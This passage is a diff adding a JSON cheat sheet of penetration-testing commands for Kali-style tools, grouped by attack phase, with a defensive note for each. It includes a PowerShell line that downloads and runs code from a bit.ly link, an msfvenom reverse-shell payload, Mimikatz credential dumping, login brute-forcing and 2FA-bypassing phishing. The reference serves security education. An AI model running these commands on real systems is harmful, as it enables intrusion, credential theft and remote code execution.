@@ -1,0 +1,997 @@
+{
+    "version": "4.1",
+    "version_id": 4.1,
+    "last_updated": "2024-06-11",
+    "description": "A comprehensive, structured list of cybersecurity commands for educational and authorized penetration testing purposes. Each entry includes defensive context to promote ethical security practices and covers a wide range of tools available in distributions like Kali Linux.",
+    "metadata": {
+        "author": "Cybersecurity Community",
+        "license": "Educational Use Only",
+        "warning": "Use only on systems you own or have explicit written permission to test",
+        "update_frequency": "Quarterly"
+    },
+    "categories": [
+        {
+            "category_name": "Reconnaissance - OSINT & Footprinting",
+            "category_id": 101,
+            "category_description": "Gathering information from publicly available sources without direct interaction with the target's systems.",
+            "commands": [
+                {
+                    "command_id": 1001,
+                    "tool": "whois",
+                    "command_template": "whois [domain]",
+                    "description": "Queries the Whois database for domain registration details like owner, contact info, and name servers.",
+                    "example_usage": "whois example.com",
+                    "tags": ["recon", "passive", "osint", "domain"],
+                    "defensive_context": "Domain privacy services can be used to redact personal information from Whois records. Security teams should monitor Whois changes for potential domain hijacking.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name"]
+                },
+                {
+                    "command_id": 1002,
+                    "tool": "dig",
+                    "command_template": "dig [domain] ANY",
+                    "description": "Performs DNS queries to retrieve various records (A, MX, NS, TXT) associated with a domain.",
+                    "example_usage": "dig example.com ANY",
+                    "tags": ["recon", "passive", "osint", "dns"],
+                    "defensive_context": "Limit the amount of sensitive information stored in public DNS records (e.g., in TXT records). Use services like DNSSEC to ensure the integrity of DNS responses.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name"]
+                },
+                {
+                    "command_id": 1003,
+                    "tool": "theHarvester",
+                    "command_template": "theharvester -d [domain] -l 500 -b all",
+                    "description": "Gathers emails, subdomains, hosts, and employee names from various public sources like search engines and social media.",
+                    "example_usage": "theharvester -d example.com -l 200 -b google,linkedin",
+                    "tags": ["recon", "passive", "osint", "email", "subdomain"],
+                    "defensive_context": "Educate employees on the information they share on public platforms. Implement DMARC, DKIM, and SPF to protect against email spoofing.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name", "python"]
+                },
+                {
+                    "command_id": 1004,
+                    "tool": "Shodan",
+                    "command_template": "shodan search [query]",
+                    "description": "Searches the Shodan database for internet-connected devices, services, and potential vulnerabilities.",
+                    "example_usage": "shodan search org:\"Example Inc\" apache",
+                    "tags": ["recon", "passive", "osint", "iot", "external"],
+                    "defensive_context": "Regularly scan your own public IP ranges to identify and remediate unintentionally exposed services. Implement strong firewall rules to restrict access to necessary ports only.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "shodan_account"]
+                },
+                {
+                    "command_id": 1005,
+                    "tool": "subfinder",
+                    "command_template": "subfinder -d [domain]",
+                    "description": "A fast passive subdomain discovery tool that queries multiple online sources.",
+                    "example_usage": "subfinder -d example.com -o subdomains.txt",
+                    "tags": ["recon", "passive", "osint", "subdomain"],
+                    "defensive_context": "Maintain an asset inventory of all official subdomains. Use Certificate Transparency log monitoring to detect the creation of unauthorized subdomains.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name", "go"]
+                },
+                {
+                    "command_id": 1006,
+                    "tool": "metagoofil",
+                    "command_template": "metagoofil -d [domain] -t pdf,doc,xls -l 100 -o files",
+                    "description": "Extracts metadata from public documents (pdf, doc, xls, etc.) belonging to a target company.",
+                    "example_usage": "metagoofil -d example.com -t pdf -l 50 -f results.html",
+                    "tags": ["recon", "passive", "osint", "metadata"],
+                    "defensive_context": "Implement policies for scrubbing metadata from publicly released documents. Educate users on the risks of sensitive information leakage through file metadata.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name", "python"]
+                },
+                {
+                    "command_id": 1007,
+                    "tool": "maltego",
+                    "command_template": "maltego (GUI)",
+                    "description": "Interactive data mining tool that renders directed graphs for link analysis and data visualization.",
+                    "example_usage": "Launch Maltego and use transforms to map relationships between domains, emails, and infrastructure.",
+                    "tags": ["recon", "osint", "visualization", "graph"],
+                    "defensive_context": "Monitor for data aggregation from public sources. Implement data classification policies to control what information is publicly available.",
+                    "risk_level": "low",
+                    "prerequisites": ["gui", "maltego_license"]
+                },
+                {
+                    "command_id": 1008,
+                    "tool": "recon-ng",
+                    "command_template": "recon-ng",
+                    "description": "Web reconnaissance framework with independent modules, database interaction, and built-in convenience functions.",
+                    "example_usage": "recon-ng, workspaces create example, use recon/domains-hosts/google_site_web, set source example.com, run",
+                    "tags": ["recon", "osint", "framework", "modular"],
+                    "defensive_context": "Regularly audit your digital footprint using similar tools. Limit information disclosure in public code repositories and technical documents.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "python"]
+                },
+                {
+                    "command_id": 1054,
+                    "tool": "Amass",
+                    "command_template": "amass enum -d [domain]",
+                    "description": "Performs in-depth DNS enumeration and network mapping to discover subdomains and infrastructure.",
+                    "example_usage": "amass enum -active -d example.com -p 80,443,8080",
+                    "tags": ["recon", "active", "osint", "subdomain", "dns"],
+                    "defensive_context": "Use wildcard DNS records carefully. Monitor certificate transparency logs and DNS queries to detect enumeration activities.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "domain_name", "go"]
+                },
+                {
+                    "command_id": 1055,
+                    "tool": "SpiderFoot",
+                    "command_template": "spiderfoot -l [IP]:[PORT]",
+                    "description": "OSINT automation tool that integrates with dozens of data sources to gather and analyze intelligence on IPs, domains, emails, etc.",
+                    "example_usage": "spiderfoot -l 127.0.0.1:5001 (then use web UI)",
+                    "tags": ["recon", "osint", "automation", "framework"],
+                    "defensive_context": "Understand your organization's public footprint by running SpiderFoot against your own assets. Minimize public data exposure where possible.",
+                    "risk_level": "low",
+                    "prerequisites": ["python3", "web_browser"]
+                }
+            ]
+        },
+        {
+            "category_name": "Network Scanning & Enumeration",
+            "category_id": 102,
+            "category_description": "Discovering hosts, services, and network infrastructure through active probing.",
+            "commands": [
+                {
+                    "command_id": 1009,
+                    "tool": "nmap",
+                    "command_template": "nmap -sV -sC -oA [output_file] [target]",
+                    "description": "Network mapper for port scanning, service version detection, and running NSE scripts for vulnerability discovery.",
+                    "example_usage": "nmap -A -p- -T4 -oA nmap_scan 192.168.1.0/24",
+                    "tags": ["scanning", "enumeration", "network", "discovery"],
+                    "defensive_context": "Deploy firewalls and Intrusion Detection/Prevention Systems (IDS/IPS) to detect and block aggressive scans. Close all unnecessary ports on systems.",
+                    "risk_level": "medium",
+                    "prerequisites": ["network_access"]
+                },
+                {
+                    "command_id": 1010,
+                    "tool": "masscan",
+                    "command_template": "masscan [target_range] -p[ports] --rate=[packets_per_sec]",
+                    "description": "Extremely fast TCP port scanner for scanning large IP ranges quickly.",
+                    "example_usage": "masscan 10.0.0.0/8 -p80,443,22,3389 --rate=10000",
+                    "tags": ["scanning", "fast", "network", "large_scale"],
+                    "defensive_context": "Rate-limiting and IP-based blocking can help mitigate the effectiveness of high-speed scanners. IDS/IPS systems are key for detection.",
+                    "risk_level": "medium",
+                    "prerequisites": ["network_access", "root_privileges"]
+                },
+                {
+                    "command_id": 1011,
+                    "tool": "netdiscover",
+                    "command_template": "netdiscover -i [interface] -r [range]",
+                    "description": "Active/passive ARP reconnaissance tool for discovering live hosts on a network segment.",
+                    "example_usage": "netdiscover -i eth0 -r 192.168.1.0/24",
+                    "tags": ["scanning", "arp", "internal", "host_discovery"],
+                    "defensive_context": "Implement port security on network switches to prevent unauthorized devices. Monitor for ARP anomalies and use network access control (NAC).",
+                    "risk_level": "medium",
+                    "prerequisites": ["network_access", "root_privileges"]
+                },
+                {
+                    "command_id": 1012,
+                    "tool": "hping3",
+                    "command_template": "hping3 -S -p [port] [target]",
+                    "description": "Network tool able to send custom TCP/IP packets and display target replies like ping does with ICMP replies.",
+                    "example_usage": "hping3 -S -p 80 -c 5 192.168.1.1",
+                    "tags": ["scanning", "packet_crafting", "firewall_testing"],
+                    "defensive_context": "Configure firewalls to drop unwanted packet types. Use IDS/IPS to detect packet crafting and unusual scan patterns.",
+                    "risk_level": "medium",
+                    "prerequisites": ["network_access", "root_privileges"]
+                },
+                {
+                    "command_id": 1056,
+                    "tool": "Enum4linux-ng",
+                    "command_template": "enum4linux-ng -A [target_ip]",
+                    "description": "A next-generation reimplementation of Enum4linux for enumerating information from Windows and Samba systems.",
+                    "example_usage": "enum4linux-ng -A 192.168.1.105",
+                    "tags": ["enumeration", "smb", "windows", "samba", "internal"],
+                    "defensive_context": "Disable NetBIOS over TCP/IP, restrict anonymous access to SMB shares, and implement strict network access controls for ports 139/445.",
+                    "risk_level": "medium",
+                    "prerequisites": ["network_access", "smb_service"]
+                },
+                {
+                    "command_id": 1057,
+                    "tool": "arp-scan",
+                    "command_template": "arp-scan --localnet",
+                    "description": "Discovers hosts on the local network by sending ARP packets and displaying the responses.",
+                    "example_usage": "sudo arp-scan -I eth0 --localnet",
+                    "tags": ["scanning", "arp", "internal", "host_discovery", "layer2"],
+                    "defensive_context": "Use Dynamic ARP Inspection (DAI) on capable network hardware. Monitor for unusual levels of ARP traffic as a sign of scanning.",
+                    "risk_level": "low",
+                    "prerequisites": ["local_network_access", "root_privileges"]
+                }
+            ]
+        },
+        {
+            "category_name": "Web Application Testing",
+            "category_id": 103,
+            "category_description": "Identifying vulnerabilities and security issues in web applications and services.",
+            "commands": [
+                {
+                    "command_id": 1013,
+                    "tool": "Burp Suite",
+                    "command_template": "burpsuite (GUI) or java -jar burpsuite.jar",
+                    "description": "Integrated platform for performing security testing of web applications with various tools including proxy, scanner, and intruder.",
+                    "example_usage": "Configure browser proxy to 127.0.0.1:8080 and use Burp to intercept/modify requests",
+                    "tags": ["web", "proxy", "scanner", "interception"],
+                    "defensive_context": "Implement WAF (Web Application Firewall), input validation, and output encoding. Regularly conduct security code reviews and penetration tests.",
+                    "risk_level": "medium",
+                    "prerequisites": ["java", "web_application"]
+                },
+                {
+                    "command_id": 1014,
+                    "tool": "OWASP ZAP",
+                    "command_template": "zaproxy (GUI) or zap-baseline.py -t [url]",
+                    "description": "Open source web application security scanner with automated and manual testing capabilities.",
+                    "example_usage": "zap-baseline.py -t https://example.com -r report.html",
+                    "tags": ["web", "scanner", "automated", "owasp"],
+                    "defensive_context": "Follow OWASP security guidelines. Implement security headers (CSP, HSTS) and conduct regular vulnerability assessments.",
+                    "risk_level": "medium",
+                    "prerequisites": ["java", "web_application"]
+                },
+                {
+                    "command_id": 1015,
+                    "tool": "sqlmap",
+                    "command_template": "sqlmap -u \"[url]\" --risk=3 --level=5",
+                    "description": "Automatic SQL injection and database takeover tool with extensive detection engine and takeover capabilities.",
+                    "example_usage": "sqlmap -u \"http://test.com/page.php?id=1\" --dbs --batch",
+                    "tags": ["web", "sqli", "database", "exploitation"],
+                    "defensive_context": "Use parameterized queries/prepared statements, input validation, and principle of least privilege for database accounts. Implement WAF with SQLi rules.",
+                    "risk_level": "high",
+                    "prerequisites": ["web_application", "vulnerable_parameter"]
+                },
+                {
+                    "command_id": 1016,
+                    "tool": "XSStrike",
+                    "command_template": "python3 xsstrike.py -u \"[url]\"",
+                    "description": "Advanced XSS detection and exploitation suite with powerful fuzzing engine.",
+                    "example_usage": "python3 xsstrike.py -u \"http://test.com/search?q=test\" --crawl",
+                    "tags": ["web", "xss", "fuzzing", "client_side"],
+                    "defensive_context": "Implement Content Security Policy (CSP), input validation, and output encoding. Use security headers like X-XSS-Protection.",
+                    "risk_level": "medium",
+                    "prerequisites": ["python3", "web_application"]
+                },
+                {
+                    "command_id": 1017,
+                    "tool": "dirb",
+                    "command_template": "dirb [url] [wordlist]",
+                    "description": "Web content scanner that looks for existing and/or hidden web objects using wordlists.",
+                    "example_usage": "dirb http://example.com /usr/share/wordlists/dirb/common.txt",
+                    "tags": ["web", "directory_bruteforce", "discovery"],
+                    "defensive_context": "Disable directory listings, use non-obvious directory names, and implement proper access controls. Monitor for 404 errors indicating scanning activity.",
+                    "risk_level": "low",
+                    "prerequisites": ["web_application"]
+                },
+                {
+                    "command_id": 1018,
+                    "tool": "ffuf",
+                    "command_template": "ffuf -w [wordlist]:FUZZ -u http://[target]/FUZZ",
+                    "description": "Fast web fuzzer written in Go used for directory/file fuzzing, virtual host discovery, and parameter fuzzing.",
+                    "example_usage": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ -e .php,.html,.bak",
+                    "tags": ["web", "fuzzing", "bruteforce", "discovery"],
+                    "defensive_context": "Implement rate limiting, WAF protection, and monitor for brute force patterns in web logs.",
+                    "risk_level": "low",
+                    "prerequisites": ["web_application", "wordlist"]
+                },
+                {
+                    "command_id": 1058,
+                    "tool": "Gobuster",
+                    "command_template": "gobuster dir -u [url] -w [wordlist]",
+                    "description": "A fast tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names.",
+                    "example_usage": "gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt",
+                    "tags": ["web", "directory_bruteforce", "dns_bruteforce", "discovery"],
+                    "defensive_context": "Use non-predictable naming for sensitive files/directories. Implement rate limiting and monitor for a high rate of 404 responses from a single IP.",
+                    "risk_level": "low",
+                    "prerequisites": ["web_application", "wordlist", "go"]
+                },
+                {
+                    "command_id": 1059,
+                    "tool": "Commix",
+                    "command_template": "commix -u \"[url_with_param]\"",
+                    "description": "Automated command injection and exploitation tool. Can detect and exploit command injection flaws in web applications.",
+                    "example_usage": "commix -u \"http://test.com/exec.php?cmd=ls\" --os-shell",
+                    "tags": ["web", "command_injection", "rce", "exploitation"],
+                    "defensive_context": "Strongly validate and sanitize all user-supplied input. Avoid using shell commands with user input. Use safe APIs for system calls.",
+                    "risk_level": "high",
+                    "prerequisites": ["web_application", "vulnerable_parameter", "python"]
+                }
+            ]
+        },
+        {
+            "category_name": "Vulnerability Assessment",
+            "category_id": 104,
+            "category_description": "Systematic identification and analysis of security vulnerabilities in systems and applications.",
+            "commands": [
+                {
+                    "command_id": 1019,
+                    "tool": "Nessus",
+                    "command_template": "nessus (GUI) or nessuscli scan [options]",
+                    "description": "Comprehensive vulnerability scanner with extensive plugin database for network and application vulnerabilities.",
+                    "example_usage": "nessus -q -x -T html -o report.html 192.168.1.0/24",
+                    "tags": ["vulnerability", "scanner", "comprehensive", "enterprise"],
+                    "defensive_context": "Establish regular vulnerability scanning program, prioritize patching based on risk, and implement configuration management.",
+                    "risk_level": "medium",
+                    "prerequisites": ["nessus_license", "network_access"]
+                },
+                {
+                    "command_id": 1020,
+                    "tool": "OpenVAS",
+                    "command_template": "gvm-cli [options] or greenbone-security-assistant (GUI)",
+                    "description": "Full-featured vulnerability management system with web interface and comprehensive scanning capabilities.",
+                    "example_usage": "gvm-cli socket --xml \"<get_tasks/>\"",
+                    "tags": ["vulnerability", "scanner", "open_source", "management"],
+                    "defensive_context": "Use vulnerability management as part of defense-in-depth strategy. Correlate scan results with threat intelligence.",
+                    "risk_level": "medium",
+                    "prerequisites": ["openvas_installation", "network_access"]
+                },
+                {
+                    "command_id": 1021,
+                    "tool": "Nuclei",
+                    "command_template": "nuclei -u [target] -t [templates]",
+                    "description": "Fast and customizable vulnerability scanner based on simple YAML-based template definitions.",
+                    "example_usage": "nuclei -u https://example.com -t /home/user/nuclei-templates/cves/",
+                    "tags": ["vulnerability", "scanner", "fast", "template_based"],
+                    "defensive_context": "Subscribe to vulnerability feeds and use defensive scanning to identify exposed vulnerabilities before attackers do.",
+                    "risk_level": "low",
+                    "prerequisites": ["internet", "target_url"]
+                },
+                {
+                    "command_id": 1022,
+                    "tool": "nikto",
+                    "command_template": "nikto -h [target]",
+                    "description": "Web server scanner that tests for dangerous files/CGIs, outdated server software, and other problems.",
+                    "example_usage": "nikto -h http://example.com -o nikto_report.html",
+                    "tags": ["web", "vulnerability", "scanner", "server_testing"],
+                    "defensive_context": "Harden web servers following security benchmarks (CIS), keep software updated, and remove unnecessary files/CGIs.",
+                    "risk_level": "low",
+                    "prerequisites": ["web_application"]
+                },
+                {
+                    "command_id": 1060,
+                    "tool": "WPScan",
+                    "command_template": "wpscan --url [wordpress_site_url]",
+                    "description": "Black box WordPress security scanner to find security weaknesses in WordPress installations and their plugins/themes.",
+                    "example_usage": "wpscan --url http://wp-site.com --enumerate u,t,p --api-token YOUR_API_TOKEN",
+                    "tags": ["vulnerability", "scanner", "cms", "wordpress", "web"],
+                    "defensive_context": "Keep WordPress core, themes, and plugins updated. Use strong, unique passwords and enable 2FA. Limit plugin usage to trusted sources.",
+                    "risk_level": "medium",
+                    "prerequisites": ["ruby", "wordpress_site"]
+                },
+                {
+                    "command_id": 1061,
+                    "tool": "Legion",
+                    "command_template": "legion (GUI)",
+                    "description": "A GUI-based, semi-automated network penetration testing framework that automates scanning with tools like Nmap, Nikto, and Dirb.",
+                    "example_usage": "Launch Legion GUI, add hosts, and run scans.",
+                    "tags": ["vulnerability", "scanner", "automation", "framework", "gui"],
+                    "defensive_context": "Understand that attackers use automated tools. A strong defensive posture with IDS/IPS and proactive patching is crucial.",
+                    "risk_level": "medium",
+                    "prerequisites": ["gui", "python3"]
+                }
+            ]
+        },
+        {
+            "category_name": "Exploitation Frameworks",
+            "category_id": 105,
+            "category_description": "Tools and frameworks for developing, testing, and executing exploit code against target systems.",
+            "commands": [
+                {
+                    "command_id": 1023,
+                    "tool": "Metasploit Framework",
+                    "command_template": "msfconsole",
+                    "description": "Comprehensive penetration testing framework with exploit development, testing, and execution capabilities.",
+                    "example_usage": "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
+                    "tags": ["exploitation", "framework", "payloads", "post_exploitation"],
+                    "defensive_context": "Implement patch management, application whitelisting, EDR solutions, and network segmentation to limit exploit impact.",
+                    "risk_level": "high",
+                    "prerequisites": ["ruby", "target_vulnerability"]
+                },
+                {
+                    "command_id": 1024,
+                    "tool": "searchsploit",
+                    "command_template": "searchsploit [search_terms]",
+                    "description": "Command-line search tool for Exploit-DB that allows offline exploitation research.",
+                    "example_usage": "searchsploit apache 2.4.49",
+                    "tags": ["exploitation", "research", "offline", "exploit_db"],
+                    "defensive_context": "Monitor for public exploit releases related to your software stack and prioritize patching accordingly.",
+                    "risk_level": "low",
+                    "prerequisites": ["exploit_db_local_copy"]
+                },
+                {
+                    "command_id": 1025,
+                    "tool": "msfvenom",
+                    "command_template": "msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format]",
+                    "description": "Standalone payload generator that combines msfpayload and msfencode for creating custom payloads.",
+                    "example_usage": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe",
+                    "tags": ["payload", "generator", "antivirus_evasion"],
+                    "defensive_context": "Deploy EDR solutions, application whitelisting, and conduct regular malware analysis training.",
+                    "risk_level": "high",
+                    "prerequisites": ["metasploit", "payload_requirements"]
+                },
+                {
+                    "command_id": 1062,
+                    "tool": "Evil-WinRM",
+                    "command_template": "evil-winrm -i [target_ip] -u [user] -p [password]",
+                    "description": "The ultimate WinRM shell for hacking. Useful for post-exploitation on Windows systems where WinRM is enabled.",
+                    "example_usage": "evil-winrm -i 192.168.1.50 -u Administrator -p 'Password123!'",
+                    "tags": ["exploitation", "post_exploitation", "windows", "winrm"],
+                    "defensive_context": "Disable WinRM if not required. If required, use strong passwords, implement network segmentation, and log PowerShell activity.",
+                    "risk_level": "high",
+                    "prerequisites": ["ruby", "winrm_enabled", "credentials"]
+                },
+                {
+                    "command_id": 1063,
+                    "tool": "Cobalt Strike",
+                    "command_template": "cobaltstrike (GUI)",
+                    "description": "A commercial adversary simulation and red team operations platform. Used for post-exploitation and lateral movement.",
+                    "example_usage": "Start teamserver, connect client, generate beacon payload, and deploy on target.",
+                    "tags": ["exploitation", "c2", "framework", "red_team", "post_exploitation"],
+                    "defensive_context": "Use EDR solutions to detect beaconing activity. Monitor for suspicious PowerShell usage and network traffic to unknown domains.",
+                    "risk_level": "high",
+                    "prerequisites": ["commercial_license", "target_access"]
+                }
+            ]
+        },
+        {
+            "category_name": "Password Attacks & Cracking",
+            "category_id": 106,
+            "category_description": "Techniques and tools for testing password strength, cracking hashes, and testing authentication mechanisms.",
+            "commands": [
+                {
+                    "command_id": 1026,
+                    "tool": "John the Ripper",
+                    "command_template": "john [hash_file] --wordlist=[wordlist]",
+                    "description": "Fast password cracker currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
+                    "example_usage": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+                    "tags": ["password", "cracking", "offline", "hash"],
+                    "defensive_context": "Use strong, complex passwords with salts, implement account lockout policies, and use multi-factor authentication.",
+                    "risk_level": "medium",
+                    "prerequisites": ["password_hashes", "wordlist"]
+                },
+                {
+                    "command_id": 1027,
+                    "tool": "Hashcat",
+                    "command_template": "hashcat -m [hash_type] [hash_file] [wordlist]",
+                    "description": "Advanced password recovery tool supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
+                    "example_usage": "hashcat -m 1000 nt_hashes.txt rockyou.txt -O",
+                    "tags": ["password", "cracking", "gpu", "advanced"],
+                    "defensive_context": "Use modern hashing algorithms (bcrypt, Argon2), implement password complexity requirements, and monitor for hash dumping attempts.",
+                    "risk_level": "medium",
+                    "prerequisites": ["gpu_recommended", "password_hashes"]
+                },
+                {
+                    "command_id": 1028,
+                    "tool": "Hydra",
+                    "command_template": "hydra -L [users] -P [passwords] [protocol]://[target]",
+                    "description": "Parallelized login cracker which supports numerous protocols to attack.",
+                    "example_usage": "hydra -L users.txt -P passwords.txt ssh://192.168.1.100",
+                    "tags": ["password", "bruteforce", "online", "authentication"],
+                    "defensive_context": "Implement account lockout policies, rate limiting, CAPTCHA, and multi-factor authentication for sensitive services.",
+                    "risk_level": "high",
+                    "prerequisites": ["network_access", "service_access"]
+                },
+                {
+                    "command_id": 1029,
+                    "tool": "Crunch",
+                    "command_template": "crunch [min] [max] [charset] -o [output_file]",
+                    "description": "Wordlist generator that can create custom wordlists based on specified character sets and patterns.",
+                    "example_usage": "crunch 6 8 0123456789abcdef -o wordlist.txt",
+                    "tags": ["wordlist", "generator", "custom", "bruteforce"],
+                    "defensive_context": "Enforce strong password policies that require sufficient length and complexity to resist brute force attacks.",
+                    "risk_level": "low",
+                    "prerequisites": ["storage_space"]
+                },
+                {
+                    "command_id": 1064,
+                    "tool": "Medusa",
+                    "command_template": "medusa -h [target_ip] -U [user_file] -P [pass_file] -M [service]",
+                    "description": "A speedy, parallel, modular, login brute-forcer supporting numerous services.",
+                    "example_usage": "medusa -h 192.168.1.20 -u admin -P passwords.txt -M smbnt",
+                    "tags": ["password", "bruteforce", "online", "authentication"],
+                    "defensive_context": "Utilize Intrusion Prevention Systems (IPS) to detect and block brute-force attempts. Enforce strict account lockout policies.",
+                    "risk_level": "high",
+                    "prerequisites": ["network_access", "service_access"]
+                },
+                {
+                    "command_id": 1065,
+                    "tool": "Cewl",
+                    "command_template": "cewl [url] -w [output_file]",
+                    "description": "Custom Wordlist Generator that spiders a given URL to a specified depth, collecting words that can be used for password cracking.",
+                    "example_usage": "cewl http://example.com -d 2 -m 6 -w custom_words.txt",
+                    "tags": ["wordlist", "generator", "osint", "password"],
+                    "defensive_context": "Educate users not to use passwords related to their work or personal information found on public websites. Enforce password complexity.",
+                    "risk_level": "low",
+                    "prerequisites": ["target_url"]
+                }
+            ]
+        },
+        {
+            "category_name": "Wireless Network Testing",
+            "category_id": 107,
+            "category_description": "Tools and techniques for assessing the security of wireless networks and protocols.",
+            "commands": [
+                {
+                    "command_id": 1030,
+                    "tool": "Aircrack-ng Suite",
+                    "command_template": "airmon-ng start [interface]",
+                    "description": "Complete tool suite to assess WiFi network security covering monitoring, attacking, testing and cracking.",
+                    "example_usage": "airmon-ng start wlan0 && airodump-ng wlan0mon",
+                    "tags": ["wireless", "wifi", "monitoring", "cracking"],
+                    "defensive_context": "Use WPA3 where available, implement strong passphrases, disable WPS, and monitor for rogue access points.",
+                    "risk_level": "medium",
+                    "prerequisites": ["compatible_wireless_card", "root_privileges"]
+                },
+                {
+                    "command_id": 1031,
+                    "tool": "Kismet",
+                    "command_template": "kismet -c [interface]",
+                    "description": "Wireless network detector, sniffer, and intrusion detection system that works with any raw 802.11 card.",
+                    "example_usage": "kismet -c wlan0mon",
+                    "tags": ["wireless", "detection", "monitoring", "ids"],
+                    "defensive_context": "Use wireless intrusion detection systems (WIDS), regularly scan for rogue access points, and implement 802.1X authentication.",
+                    "risk_level": "low",
+                    "prerequisites": ["compatible_wireless_card"]
+                },
+                {
+                    "command_id": 1032,
+                    "tool": "Wifite",
+                    "command_template": "wifite",
+                    "description": "Automated wireless attack tool that simplifies the process of auditing WEP, WPA, and WPS enabled networks.",
+                    "example_usage": "wifite --wpa --bully",
+                    "tags": ["wireless", "automated", "wpa", "wps"],
+                    "defensive_context": "Disable WPS, use WPA3 with strong passwords, implement MAC filtering where appropriate, and monitor for deauth attacks.",
+                    "risk_level": "medium",
+                    "prerequisites": ["compatible_wireless_card", "root_privileges"]
+                },
+                {
+                    "command_id": 1066,
+                    "tool": "Reaver",
+                    "command_template": "reaver -i [interface] -b [bssid] -vv",
+                    "description": "Performs a brute force attack against Wi-Fi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.",
+                    "example_usage": "reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1",
+                    "tags": ["wireless", "wps", "bruteforce", "cracking"],
+                    "defensive_context": "Disable WPS on all wireless access points. Modern devices have brute-force protection, but disabling is the safest option.",
+                    "risk_level": "medium",
+                    "prerequisites": ["compatible_wireless_card", "wps_enabled_ap"]
+                },
+                {
+                    "command_id": 1067,
+                    "tool": "Bettercap",
+                    "command_template": "bettercap -iface [interface]",
+                    "description": "A powerful, flexible, and portable tool for Man-in-the-Middle attacks. Can be used for Wi-Fi sniffing, spoofing, and credential harvesting.",
+                    "example_usage": "sudo bettercap -iface eth0 -caplet http-ui",
+                    "tags": ["wireless", "mitm", "spoofing", "sniffing", "framework"],
+                    "defensive_context": "Use VPNs on untrusted networks. Implement HSTS and certificate pinning in applications. Educate users about phishing and fake access points.",
+                    "risk_level": "high",
+                    "prerequisites": ["network_access", "root_privileges"]
+                }
+            ]
+        },
+        {
+            "category_name": "Social Engineering",
+            "category_id": 108,
+            "category_description": "Tools and techniques for testing human factors and organizational security awareness.",
+            "commands": [
+                {
+                    "command_id": 1033,
+                    "tool": "Social Engineering Toolkit (SET)",
+                    "command_template": "setoolkit",
+                    "description": "Open-source penetration testing framework designed for social engineering attacks with numerous attack vectors.",
+                    "example_usage": "Select: 1) Social-Engineering Attacks, 2) Website Attack Vectors, 3) Credential Harvester Attack Method",
+                    "tags": ["social_engineering", "phishing", "human_factors"],
+                    "defensive_context": "Implement security awareness training, email filtering, web filtering, and multi-factor authentication.",
+                    "risk_level": "high",
+                    "prerequisites": ["python", "social_engineering_authorization"]
+                },
+                {
+                    "command_id": 1034,
+                    "tool": "Gophish",
+                    "command_template": "./gophish (from installation directory)",
+                    "description": "Open-source phishing framework that makes it easy to test organizational phishing susceptibility.",
+                    "example_usage": "Access web interface at https://localhost:3333 after starting",
+                    "tags": ["phishing", "simulation", "awareness_training"],
+                    "defensive_context": "Conduct regular phishing simulations, implement DMARC/DKIM/SPF, and provide continuous security awareness education.",
+                    "risk_level": "medium",
+                    "prerequisites": ["web_browser", "email_infrastructure"]
+                },
+                {
+                    "command_id": 1035,
+                    "tool": "King Phisher",
+                    "command_template": "king-phisher (GUI) or king-phisher-server",
+                    "description": "Phishing campaign toolkit used for creating and managing multiple simultaneous phishing attacks with custom email and server content.",
+                    "example_usage": "Launch GUI and configure template, target list, and server settings",
+                    "tags": ["phishing", "campaign", "simulation"],
+                    "defensive_context": "Deploy advanced email security gateways, implement URL filtering, and train users to identify suspicious emails.",
+                    "risk_level": "medium",
+                    "prerequisites": ["python3", "postgresql"]
+                },
+                {
+                    "command_id": 1068,
+                    "tool": "evilginx2",
+                    "command_template": "evilginx2 -p [phishlets_path]",
+                    "description": "A man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing 2-factor authentication.",
+                    "example_usage": "./evilginx2 -p ./phishlets/ -g",
+                    "tags": ["social_engineering", "phishing", "2fa_bypass", "mitm"],
+                    "defensive_context": "Use FIDO2/U2F hardware tokens as they are resistant to phishing. Train users to inspect URLs and be wary of unexpected login prompts.",
+                    "risk_level": "high",
+                    "prerequisites": ["public_server", "domain_name", "go"]
+                }
+            ]
+        },
+        {
+            "category_name": "Post-Exploitation & Persistence",
+            "category_id": 109,
+            "category_description": "Techniques and tools for maintaining access, escalating privileges, and establishing persistence on compromised systems.",
+            "commands": [
+                {
+                    "command_id": 1036,
+                    "tool": "Mimikatz",
+                    "command_template": "mimikatz.exe",
+                    "description": "Tool to extract plaintext passwords, hash, PIN code and kerberos tickets from memory and perform pass-the-hash attacks.",
+                    "example_usage": "mimikatz # privilege::debug # sekurlsa::logonpasswords",
+                    "tags": ["post_exploitation", "credential_dumping", "windows"],
+                    "defensive_context": "Enable Credential Guard, implement LSA protection, restrict debug privileges, and monitor for LSASS access.",
+                    "risk_level": "high",
+                    "prerequisites": ["windows_system", "administrative_privileges"]
+                },
+                {
+                    "command_id": 1037,
+                    "tool": "PowerSploit",
+                    "command_template": "Import-Module [module_path]",
+                    "description": "Collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.",
+                    "example_usage": "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1tCrad1e')",
+                    "tags": ["post_exploitation", "powershell", "windows"],
+                    "defensive_context": "Implement PowerShell logging, constrained language mode, and application whitelisting. Monitor for unusual PowerShell activity.",
+                    "risk_level": "high",
+                    "prerequisites": ["windows_powershell", "execution_policy_bypass"]
+                },
+                {
+                    "command_id": 1038,
+                    "tool": "BloodHound",
